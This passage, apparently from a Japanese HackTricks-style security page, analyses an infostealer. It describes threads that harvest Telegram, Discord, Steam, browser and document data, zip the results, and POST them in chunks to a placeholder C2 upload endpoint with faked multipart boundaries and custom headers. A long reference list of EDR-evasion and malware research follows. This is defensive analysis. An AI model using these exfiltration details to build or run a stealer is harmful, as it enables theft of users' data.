- `create_memory_based_log` はグローバルな `memory_generators` 関数ポインタテーブルを反復し、有効な各モジュール（Telegram、Discord、Steam、screenshots、documents、browser extensions など）ごとにスレッドを生成する。各スレッドは結果を共有バッファに書き込み、約45秒の join ウィンドウ後にファイル数を報告する。
- 完了後、すべては statically linked `miniz` ライブラリで `%TEMP%\\Log.zip` として圧縮される。`ThreadPayload1` は 15 秒 sleep した後、アーカイブを 10 MB チャンクで HTTP POST により `http://<C2>:6767/upload` にストリーミングし、ブラウザの `multipart/form-data` boundary (`----WebKitFormBoundary***`) を偽装する。各チャンクには `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が追加され、最後のチャンクには `complete: true` が付与されて C2 が再組立て完了を認識する。

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
